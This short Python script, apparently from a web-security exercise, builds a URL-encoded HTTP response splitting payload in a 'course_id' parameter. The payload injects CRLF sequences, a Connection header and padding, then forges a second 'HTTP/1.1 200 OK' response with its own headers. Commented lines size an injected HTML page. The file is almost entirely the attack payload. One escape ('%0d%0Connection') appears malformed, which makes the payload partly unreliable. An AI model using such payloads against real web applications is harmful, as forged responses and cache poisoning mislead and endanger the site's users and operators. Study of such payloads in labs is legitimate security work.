# start_of_page = """<!DOCTYPE html> <html>
#                     <head>
#                     </head>
#                     <body>
#                         Hello"""
# end_of_page = """ </body> </html>"""
# script_size = len(start_of_page) + len(end_of_page)
# print(f"Content-Length: {script_size}")
# print(150 * "a")
s = "course_id=67607%0d%0Connection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"
print(len(s))
